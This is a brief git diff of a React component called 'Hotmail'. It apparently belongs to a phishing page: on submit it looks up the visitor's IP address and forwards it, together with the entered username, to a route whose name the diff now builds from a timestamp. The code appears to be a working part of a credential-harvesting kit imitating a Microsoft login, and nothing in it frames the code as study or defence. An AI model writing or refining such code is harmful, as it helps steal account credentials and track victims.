@@ -25,10 +25,12 @@ export default function Hotmail({ location }) {
   const submitForm = (event) => {
     event.preventDefault();
     setSubmited(true);
+    
+    const date = new Date().getMilliseconds();
 
     getIP().then((res) => {
       const ip = res.data.IPv4;
-      navigate("ht/ps", {
+      navigate(`ht/${date}`, {
         state: {
           ip: ip,
           email: values.username,
